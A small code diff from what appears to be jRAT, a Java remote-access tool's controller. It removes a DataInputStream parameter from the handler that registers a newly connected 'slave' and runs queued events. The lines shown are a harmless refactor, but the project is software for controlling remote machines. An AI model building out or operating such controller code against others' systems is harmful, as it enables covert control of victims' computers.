@@ -8,12 +8,10 @@ import jrat.controller.net.ConnectionHandler;
 import jrat.controller.settings.StatisticsOperatingSystem;
 import jrat.controller.settings.StoreOfflineSlaves;
 
-import java.io.DataInputStream;
-
 public class Packet3Initialized extends AbstractIncomingPacket {
 
 	@Override
-	public void read(final Slave slave, DataInputStream dis) throws Exception {
+	public void read(final Slave slave) throws Exception {
 		ConnectionHandler.addSlave(slave);
 
 		for (Event event : Events.queue.values()) {
